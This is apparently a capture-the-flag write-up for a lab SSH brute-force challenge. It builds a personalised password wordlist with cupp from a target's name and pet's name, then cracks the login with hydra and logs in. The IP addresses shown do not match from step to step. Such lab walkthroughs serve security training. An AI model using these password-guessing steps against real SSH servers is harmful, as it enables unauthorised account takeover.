This is a Brute Force Attack challenge

cupp -i to create a custom wordlist with the values:
  First Name: Hernandez
  Pet's Name: Cachorro
  Do you want to add some key words about the victim?: N
  Do you want to add special characters at the end of words?: N
  Do you want to add some random numbers at the end of words?: N
  Leet mode? (i.e. leet = 1337): Y
ip neigh to locate the REACHABLE IP address of the SSH service:
  172.17.0.12 dev eth0 lladdr 02:42:ac:11:00:0c REACHABLE
hydra -l hernandez -P hernandez.txt ssh://172.17.9.2 -f -v
  host: 172.17.0.12  login: hernandez  password:c4ch0rr0

Now that we've retrieved Hernandez's credentials login to the SSH server to capture the flag

ssh hernandez@172.17.0.38

See Breaking Hollywood.pdf for detailed screenshots
